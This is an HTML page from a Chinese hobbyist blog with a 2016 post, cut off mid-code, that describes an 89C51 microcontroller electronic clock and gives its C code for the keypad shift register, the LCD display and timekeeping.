<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <title>Hsmouc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="Hsmouc">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hsmouc">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hsmouc">
<meta name="twitter:description">
  
    <link rel="alternative" href="/atom.xml" title="Hsmouc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.ico">
  
  <link rel="stylesheet" href="/css/style.css" type="text/css">
</head>

<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://ww1.sinaimg.cn/mw690/005WMcFzjw1ewktmv52wbj307y07yjrp.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">年糕</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>標籤</li>
						
						<li>友情链接</li>
						
						
						<li>關於</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
							<li><a href="/instagram">相册</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/Hsmouc" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="http://weibo.com/5449180097/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1" title="weibo">weibo</a>
					        
								<a class="facebook" target="_blank" href="https://www.facebook.com/profile.php?id=100009396457642" title="facebook">facebook</a>
					        
								<a class="google" target="_blank" href="https://plus.google.com/u/0/101351542677141027265" title="google">google</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/ARP/" style="font-size: 10px;">ARP</a> <a href="/tags/Blog/" style="font-size: 14px;">Blog</a> <a href="/tags/C/" style="font-size: 10px;">C</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/tags/Jekyll/" style="font-size: 10px;">Jekyll</a> <a href="/tags/Landscape/" style="font-size: 10px;">Landscape</a> <a href="/tags/Linux/" style="font-size: 12px;">Linux</a> <a href="/tags/MFC/" style="font-size: 18px;">MFC</a> <a href="/tags/Metasploit/" style="font-size: 10px;">Metasploit</a> <a href="/tags/OS-X/" style="font-size: 10px;">OS X</a> <a href="/tags/Pi/" style="font-size: 16px;">Pi</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Wi-Fi/" style="font-size: 14px;">Wi-Fi</a> <a href="/tags/review/" style="font-size: 10px;">review</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/tor/" style="font-size: 10px;">tor</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://lyeec.me/">墨坊</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">工科在读，C/Python学习中，嵌入式开发，前端/渗透/摄影/吃货ˉ﹃ˉ</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">年糕</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
			
				<img lazy-src="http://ww1.sinaimg.cn/mw690/005WMcFzjw1ewktmv52wbj307y07yjrp.jpg" class="js-avatar">
			
			</div>
			<hgroup>
			  <h1 class="header-author">年糕</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
					<li><a href="/instagram">相册</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/Hsmouc" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="http://weibo.com/5449180097/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1" title="weibo">weibo</a>
			        
						<a class="facebook" target="_blank" href="https://www.facebook.com/profile.php?id=100009396457642" title="facebook">facebook</a>
			        
						<a class="google" target="_blank" href="https://plus.google.com/u/0/101351542677141027265" title="google">google</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>

      <div class="body-wrap">
  
    <article id="post-2016-04-12-clock" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/04/12/2016-04-12-clock/" class="article-date">
  	<time datetime="2016-04-12T12:34:43.000Z" itemprop="datePublished">2016-04-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/04/12/2016-04-12-clock/">基于89C51的电子时钟设计</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="u7535_u5B50_u7CFB_u7EDF_u8BBE_u8BA1_u5B9E_u9A8C_u8BFE_u2013_u7535_u5B50_u949F"><a href="#u7535_u5B50_u7CFB_u7EDF_u8BBE_u8BA1_u5B9E_u9A8C_u8BFE_u2013_u7535_u5B50_u949F" class="headerlink" title="电子系统设计实验课–电子钟"></a>电子系统设计实验课–电子钟</h2><p>代码是用C写的，写的很烂，基本没有考虑优化的问题。因为只有一个周的时间，我还要上蛋疼的雅思课，所以忽略函数的胡乱调用与变量的命名吧。<br>这个电子钟实现了如下功能:   </p>
<ul>
<li>时间的精确走动</li>
<li>时分秒年月日都可以通过键盘调节</li>
<li>秒表功能    </li>
</ul>
<p>做好的效果图是这样的：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f2u9bwuytwj31kw16oax2.jpg" alt=""></p>
<h3 id="u786C_u4EF6_u8BBE_u8BA1"><a href="#u786C_u4EF6_u8BBE_u8BA1" class="headerlink" title="硬件设计"></a>硬件设计</h3><p>整体来说用了一块89C51，用hc165来读键盘的信息，hc164来将输入的串行数据转并行输出，送LCD显示。读键值的原理图如下:<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f2u8dwplkvj30jd0bctan.jpg" alt="">(乱码是什么鬼)<br>下面这张是hc164送显示的原理图:<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f2u8fxnfg7j30jz0bi40y.jpg" alt=""> (乱码又是什么鬼)</p>
<h3 id="u8F6F_u4EF6_u8BBE_u8BA1"><a href="#u8F6F_u4EF6_u8BBE_u8BA1" class="headerlink" title="软件设计"></a>软件设计</h3><p>大体上来说整个程序有两个部分:直接控制硬件的驱动层和我们实现电子钟功能的函数应用层。我们把它们分别放在DRI文件夹下和USR文件夹下。   </p>
<h4 id="u9A71_u52A8_u5C42_u8BBE_u8BA1"><a href="#u9A71_u52A8_u5C42_u8BBE_u8BA1" class="headerlink" title="驱动层设计"></a>驱动层设计</h4><p>(°_°)我要放源代码了:   </p>
<h5 id="hc165_u7684_u5E95_u5C42_u63A7_u5236_u4EE3_u7801"><a href="#hc165_u7684_u5E95_u5C42_u63A7_u5236_u4EE3_u7801" class="headerlink" title="hc165的底层控制代码"></a>hc165的底层控制代码</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;reg52.h&gt;</span></span></span><br><span class="line">sbit hc165_sdo=P1^<span class="number">5</span>;</span><br><span class="line">sbit hc165_sclk=P1^<span class="number">6</span>;</span><br><span class="line">sbit hc165_pl=P1^<span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key=<span class="number">0x3e</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hc165_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	hc165_sdo=<span class="number">1</span>;</span><br><span class="line">	hc165_sclk=<span class="number">0</span>;</span><br><span class="line">	hc165_pl=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">hc165_re</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> i,x=<span class="number">0</span>;</span><br><span class="line">	hc165_pl=<span class="number">0</span>;</span><br><span class="line">	x=x+<span class="number">0</span>;</span><br><span class="line">	hc165_pl=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>( hc165_sdo == <span class="number">1</span> )</span><br><span class="line">		x = x + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>( i = <span class="number">0</span>;i &lt; <span class="number">7</span>;i ++)&#123;</span><br><span class="line">		hc165_sclk=<span class="number">1</span>;</span><br><span class="line">		x = x &lt;&lt; <span class="number">1</span>;</span><br><span class="line">		hc165_sclk=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>( hc165_sdo == <span class="number">1</span> )</span><br><span class="line">			x = x + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="hc164_28LCD_u663E_u793A_u7684_u5E95_u5C42_u63A7_u5236_u4EE3_u7801_29"><a href="#hc164_28LCD_u663E_u793A_u7684_u5E95_u5C42_u63A7_u5236_u4EE3_u7801_29" class="headerlink" title="hc164(LCD显示的底层控制代码)"></a>hc164(LCD显示的底层控制代码)</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;reg52.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;clock.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> data second[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> timedisplay[<span class="number">14</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">sbit LCD_E = P1^<span class="number">2</span>;</span><br><span class="line">sbit LCD_RW = P1^<span class="number">1</span>;</span><br><span class="line">sbit LCD_RS = P1^<span class="number">0</span>;</span><br><span class="line">sbit HC164_SDAT = P1^<span class="number">3</span>;</span><br><span class="line">sbit HC164_SCLK = P1^<span class="number">4</span>;</span><br><span class="line"><span class="keyword">extern</span> clockTypeDef clock;</span><br><span class="line"><span class="keyword">char</span> position = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flash = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> code ascii[]=&#123;<span class="string">"0123456789"</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_data</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> dat)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">		HC164_SCLK = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(dat &amp; <span class="number">0x80</span>)&#123;</span><br><span class="line">			HC164_SDAT = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			HC164_SDAT = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		HC164_SCLK = <span class="number">1</span>;</span><br><span class="line">		dat = dat &lt;&lt; <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delay1ms</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> a,b;</span><br><span class="line">	<span class="keyword">for</span>(; c&gt;<span class="number">0</span>; c--) &#123;</span><br><span class="line">		<span class="keyword">for</span>(b = <span class="number">199</span>; b &gt; <span class="number">0</span>; b--) &#123;</span><br><span class="line">			<span class="keyword">for</span>(a = <span class="number">1</span>; a &gt; <span class="number">0</span>; a--);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LcdWrCmd</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> com)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> x;</span><br><span class="line">	LCD_E = <span class="number">0</span>;</span><br><span class="line">	LCD_RS = <span class="number">0</span>;</span><br><span class="line">	LCD_RW = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	send_data(com);</span><br><span class="line">	x++;</span><br><span class="line">	LCD_E = <span class="number">1</span>;</span><br><span class="line">	x++;</span><br><span class="line">	LCD_E = <span class="number">0</span>;</span><br><span class="line">	Delay1ms(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LcdWrData</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> dat)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> x;</span><br><span class="line">	LCD_E = <span class="number">0</span>;</span><br><span class="line">	LCD_RS = <span class="number">1</span>;</span><br><span class="line">	LCD_RW = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	send_data(dat);</span><br><span class="line">	x++;</span><br><span class="line">	LCD_E = <span class="number">1</span>;</span><br><span class="line">	x++;</span><br><span class="line">	LCD_E = <span class="number">0</span>;</span><br><span class="line">	Delay1ms(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disp_line</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> line)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(line == <span class="number">0</span>)&#123;</span><br><span class="line">		LcdWrCmd(<span class="number">0x80</span> + <span class="number">0x00</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		LcdWrCmd(<span class="number">0x80</span> + <span class="number">0x40</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LcdInit</span><span class="params">()</span></span>&#123;</span><br><span class="line">	LcdWrCmd(<span class="number">0x38</span>);</span><br><span class="line">	LcdWrCmd(<span class="number">0x0c</span>);</span><br><span class="line">	LcdWrCmd(<span class="number">0x06</span>);</span><br><span class="line">	LcdWrCmd(<span class="number">0x01</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">second_display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	LcdWrCmd(<span class="number">0x01</span>);</span><br><span class="line">	disp_line(<span class="number">0</span>);</span><br><span class="line">	LcdWrData(ascii[second[<span class="number">0</span>]/<span class="number">10</span>]);</span><br><span class="line">	LcdWrData(ascii[second[<span class="number">0</span>]%<span class="number">10</span>]);</span><br><span class="line">	LcdWrData(<span class="number">0x27</span>);</span><br><span class="line">	LcdWrData(ascii[second[<span class="number">1</span>]/<span class="number">10</span>]);</span><br><span class="line">	LcdWrData(ascii[second[<span class="number">1</span>]%<span class="number">10</span>]);</span><br><span class="line">	LcdWrData(<span class="string">'"'</span>);</span><br><span class="line">	LcdWrData(ascii[second[<span class="number">2</span>]/<span class="number">10</span>]);</span><br><span class="line">	LcdWrData(ascii[second[<span class="number">2</span>]%<span class="number">10</span>]);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">time_display</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> i;</span><br><span class="line">	timedisplay[<span class="number">0</span>] = clock.Year/<span class="number">1000</span>;</span><br><span class="line">	timedisplay[<span class="number">1</span>] = clock.Year/<span class="number">100</span>%<span class="number">10</span>;</span><br><span class="line">	timedisplay[<span class="number">2</span>] = clock.Year/<span class="number">10</span>%<span class="number">10</span>;</span><br><span class="line">	timedisplay[<span class="number">3</span>] = clock.Year%<span class="number">10</span>;</span><br><span class="line">	timedisplay[<span class="number">4</span>] = clock.Month/<span class="number">10</span>;</span><br><span class="line">	timedisplay[<span class="number">5</span>] = clock.Month%<span class="number">10</span>;</span><br><span class="line">	timedisplay[<span class="number">6</span>] = clock.Day/<span class="number">10</span>;</span><br><span class="line">	timedisplay[<span class="number">7</span>] = clock.Day%<span class="number">10</span>;</span><br><span class="line">	timedisplay[<span class="number">8</span>] = clock.Hour/<span class="number">10</span>;</span><br><span class="line">	timedisplay[<span class="number">9</span>] = clock.Hour%<span class="number">10</span>;</span><br><span class="line">	timedisplay[<span class="number">10</span>] = clock.Minute/<span class="number">10</span>;</span><br><span class="line">	timedisplay[<span class="number">11</span>] = clock.Minute%<span class="number">10</span>;</span><br><span class="line">	timedisplay[<span class="number">12</span>] = clock.Second/<span class="number">10</span>;</span><br><span class="line">	timedisplay[<span class="number">13</span>] = clock.Second%<span class="number">10</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i ++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i == <span class="number">0</span>)</span><br><span class="line">			disp_line(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span>((i == <span class="number">4</span>)||(i == <span class="number">6</span>))</span><br><span class="line">			LcdWrData(<span class="string">'-'</span>);</span><br><span class="line">		<span class="keyword">if</span>(i == <span class="number">8</span>)</span><br><span class="line">			disp_line(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span>((i == <span class="number">10</span>)||(i == <span class="number">12</span>))</span><br><span class="line">			LcdWrData(<span class="string">':'</span>);</span><br><span class="line">		<span class="keyword">if</span>((i == position)&amp;&amp;(flash == <span class="number">1</span>))&#123;</span><br><span class="line">			<span class="keyword">if</span>(j &gt;= <span class="number">25</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(j &gt;= <span class="number">50</span>)&#123;</span><br><span class="line">					j = <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				LcdWrData(<span class="string">' '</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				LcdWrData(ascii[timedisplay[i]]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			LcdWrData(ascii[timedisplay[i]]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h4 id="u7528_u6237_u5C42_u8BBE_u8BA1"><a href="#u7528_u6237_u5C42_u8BBE_u8BA1" class="headerlink" title="用户层设计"></a>用户层设计</h4><p>用户层主要是一个计算时间的函数，时间的计算是通过定时器中断实现的，中断时间是10ms一次。因为我们添加了秒表功能。</p>
<h5 id="u65F6_u95F4_u8BA1_u7B97"><a href="#u65F6_u95F4_u8BA1_u7B97" class="headerlink" title="时间计算"></a>时间计算</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;reg52.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;clock.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> data time[<span class="number">6</span>] = &#123;<span class="number">1970</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> data second[<span class="number">3</span>] =&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> timeMs10 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> secMs10 = <span class="number">0</span>;</span><br><span class="line">clockTypeDef clock;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">timeCalc</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	timeMs10++;</span><br><span class="line">	<span class="keyword">if</span>(timeMs10 == <span class="number">100</span>) &#123;</span><br><span class="line">		timeMs10 = <span class="number">0</span>;</span><br><span class="line">		time[<span class="number">5</span>]++;</span><br><span class="line">		<span class="keyword">if</span>(time[<span class="number">5</span>] == <span class="number">60</span>) &#123;</span><br><span class="line">			time[<span class="number">4</span>]++;</span><br><span class="line">			time[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span>(time[<span class="number">4</span>] == <span class="number">60</span>) &#123;</span><br><span class="line">				time[<span class="number">3</span>]++;</span><br><span class="line">				time[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">if</span>(time[<span class="number">3</span>] == <span class="number">24</span>) &#123;</span><br><span class="line">					time[<span class="number">2</span>]++;</span><br><span class="line">					time[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">					<span class="keyword">if</span>(time[<span class="number">1</span>] == <span class="number">1</span> || time[<span class="number">1</span>] == <span class="number">3</span> || time[<span class="number">1</span>] == <span class="number">5</span> || time[<span class="number">1</span>] == <span class="number">7</span> || time[<span class="number">1</span>] == <span class="number">8</span> || time[<span class="number">1</span>] == <span class="number">10</span> || time[<span class="number">1</span>] == <span class="number">12</span>) &#123;</span><br><span class="line">						<span class="keyword">if</span>(time[<span class="number">2</span>] == <span class="number">31</span>) &#123;</span><br><span class="line">							time[<span class="number">1</span>]++;</span><br><span class="line">							time[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">							<span class="keyword">if</span>(time[<span class="number">1</span>] == <span class="number">12</span>) &#123;</span><br><span class="line">								time[<span class="number">0</span>]++;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;	</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(time[<span class="number">1</span>] == <span class="number">4</span> || time[<span class="number">1</span>] == <span class="number">6</span> || time[<span class="number">1</span>] == <span class="number">9</span> || time[<span class="number">1</span>] == <span class="number">11</span>) &#123;</span><br><span class="line">						<span class="keyword">if</span>(time[<span class="number">2</span>] == <span class="number">30</span>) &#123;</span><br><span class="line">							time[<span class="number">1</span>]++;</span><br><span class="line">							time[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span 